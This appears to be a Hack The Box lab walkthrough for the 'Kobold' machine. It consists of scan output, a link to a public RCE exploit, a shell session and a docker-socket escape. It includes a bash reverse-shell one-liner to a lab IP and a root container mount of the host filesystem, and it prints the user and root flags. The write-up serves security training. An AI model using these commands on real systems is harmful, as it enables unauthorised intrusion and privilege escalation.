<img width="1592" height="325" alt="image" src="https://github.com/user-attachments/assets/99a6c452-ed69-4c65-859b-571bf26f50ed" />



```
nmap -sCV 10.129.245.50          
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-01 13:17 -0400
Nmap scan report for 10.129.245.50
Host is up (0.21s latency).
Not shown: 997 closed tcp ports (reset)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 8c:45:12:36:03:61:de:0f:0b:2b:c3:9b:2a:92:59:a1 (ECDSA)
|_  256 d2:3c:bf:ed:55:4a:52:13:b5:34:d2:fb:8f:e4:93:bd (ED25519)
80/tcp  open  http     nginx 1.24.0 (Ubuntu)
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to https://kobold.htb/
443/tcp open  ssl/http nginx 1.24.0 (Ubuntu)
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|   http/1.1
|   http/1.0
|_  http/0.9
|_http-title: Did not follow redirect to https://kobold.htb/
| ssl-cert: Subject: commonName=kobold.htb
| Subject Alternative Name: DNS:kobold.htb, DNS:*.kobold.htb
| Not valid before: 2026-03-15T15:08:55
|_Not valid after:  2125-02-19T15:08:55
|_http-server-header: nginx/1.24.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 33.82 seconds

```


<img width="1913" height="736" alt="image" src="https://github.com/user-attachments/assets/b933e69e-802f-4e07-a719-34ce2701c8c6" />



```
gobuster vhost -u "https://kobold.htb/" -w "/usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt" --append-domain --no-tls-validation
```

<img width="1490" height="570" alt="image" src="https://github.com/user-attachments/assets/54f18f20-ee97-455c-9542-55243696b412" />


<img width="1919" height="822" alt="image" src="https://github.com/user-attachments/assets/e2958873-8065-4820-ae2f-d33cd374e3dc" />


<img width="1914" height="470" alt="image" src="https://github.com/user-attachments/assets/c97b1e00-35e6-4d0b-83ca-8a345a5762e4" />




<img width="897" height="773" alt="image" src="https://github.com/user-attachments/assets/8b1ef709-e0d4-4711-89a3-197a69ec71a9" />


```
docker -H unix:///run/docker.sock run -u root -v /:/host --entrypoint /bin/sh privatebin/nginx-fpm-alpine:2.0.2 -c "chroot /host /bin/bash -c 'bash -i >& /dev/tcp/10.10.14.60/4445 0>&1'"
```

```
nano Kobold.py
```

```
https://github.com/suljov/CVE-2026-23744-Remote-Code-Execution-POC/blob/main/exploit.py
```


<img width="891" height="686" alt="image" src="https://github.com/user-attachments/assets/98993040-eaf7-45df-84d7-33cffa94bba9" />


<img width="1903" height="399" alt="image" src="https://github.com/user-attachments/assets/3f2bb56a-2e94-4c24-a586-68d1860aaacc" />



```
nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.60] from (UNKNOWN) [10.129.245.50] 45276
python3 -c "import pty;pty.spawn('/bin/bash')"
ben@kobold:/usr/local/lib/node_modules/@mcpjam/inspector$ pwd
pwd
/usr/local/lib/node_modules/@mcpjam/inspector
ben@kobold:/usr/local/lib/node_modules/@mcpjam/inspector$ cd ../../../../../../
<de_modules/@mcpjam/inspector$ cd ../../../../../../      
ben@kobold:/$ ls
ls
app   cdrom  home   lost+found  opt              root  snap  tmp
bin   dev    lib    media       privatebin-data  run   srv   usr
boot  etc    lib64  mnt         proc             sbin  sys   var
ben@kobold:/$ cd home
cd home
ben@kobold:/home$ ls
ls
alice  ben
ben@kobold:/home$ cd alice
cd alice
bash: cd: alice: Permission denied
ben@kobold:/home$ cd ben
cd ben
ben@kobold:~$ ls
ls
user.txt

ben@kobold:~$ cat user.txt
cat user.txt
22eed8f8fef3b72ff50f924aa283a139
ben@kobold:~$ docker ps

```



```
ben@kobold:/usr/local/lib/node_modules/@mcpjam/inspector$ newgrp docker
newgrp docker
ben@kobold:/usr/local/lib/node_modules/@mcpjam/inspector$ docker ps
docker ps
CONTAINER ID   IMAGE                               COMMAND                  CREATED        STATUS       PORTS                      NAMES
4c49dd7bb727   privatebin/nginx-fpm-alpine:2.0.2   "/etc/init.d/rc.local"   5 months ago   Up 2 hours   127.0.0.1:8080->8080/tcp   bin
ben@kobold:/usr/local/lib/node_modules/@mcpjam/inspector$ docker -H unix:///run/docker.sock run -u root -v /:/host --entrypoint /bin/sh privatebin/nginx-fpm-alpine:2.0.2 -c "chroot /host /bin/bash -c 'bash -i >& /dev/tcp/10.10.14.60/4445 0>&1'"
<ash -c 'bash -i >& /dev/tcp/10.10.14.60/4445 0>&1'"      

```


```
nc -lvnp 4445                    
listening on [any] 4445 ...
connect to [10.10.14.60] from (UNKNOWN) [10.129.245.50] 57434
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
groups: cannot find name for group ID 11
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

root@68268d2f30b5:/# ls
ls
app
bin
boot
cdrom
dev
etc
home
lib
lib64
lost+found
media
mnt
opt
privatebin-data
proc
root
run
sbin
snap
srv
sys
tmp
usr
var
root@68268d2f30b5:/# cd root
cd root
root@68268d2f30b5:~# ls
ls
arcane_linux_amd64
data
root.txt
root@68268d2f30b5:~# cat root.txt
cat root.txt
bd922540807ccedb3dfda3d5617215ce
root@68268d2f30b5:~# 
```



<img width="1911" height="779" alt="image" src="https://github.com/user-attachments/assets/b12b7d1a-9238-42af-8f28-9a323b1a0e74" />




<img width="656" height="465" alt="image" src="https://github.com/user-attachments/assets/417cae4e-c379-405d-a94e-d416a0a244c7" />





<img width="718" height="788" alt="image" src="https://github.com/user-attachments/assets/a67e52ab-bc45-4dde-b764-19dd26fb3a9c" />


